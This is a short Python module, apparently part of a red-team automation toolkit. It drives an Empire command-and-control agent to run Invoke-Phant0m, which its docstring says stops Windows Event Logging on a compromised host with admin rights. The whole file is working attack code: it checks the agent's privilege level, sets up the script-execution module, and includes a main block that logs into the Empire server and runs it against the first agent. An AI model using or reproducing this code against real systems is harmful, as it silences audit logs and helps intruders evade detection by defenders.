"""
Stops Windows Event Logging using Invoke-Phant0m:
https://github.com/hlldz/Invoke-Phant0m
Needs admin rights
"""
from EmpireAPIWrapper import empireAPI
from c2_settings import EMPIRE_PWD, EMPIRE_SERVER, EMPIRE_USER
from autocomplete.empire import management

def run(API, agent_name, script_path='/Users/a/Empire/lib/Invoke-Phant0m.ps1'):
    """
        Stops logging with Invoke-Phant0m
        \n:param API: EmpireAPIWrapper object
        \n:param agent_name: name of existing agent
    """
    if(API.agents()['agents'][0]['high_integrity'] == 0):
        print('Need admin rights')
        return
    opt = management.invoke_script.options
    options = {
            opt.required_agent: agent_name,
            opt.required_scriptcmd: "Invoke-Phant0m",
            opt.scriptpath: script_path
    }
    API.module_exec(management.invoke_script.path, options)
    return
    
# for unit testing of each technique
if __name__ == '__main__':
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    run(API, API.agents()['agents'][0]['name'])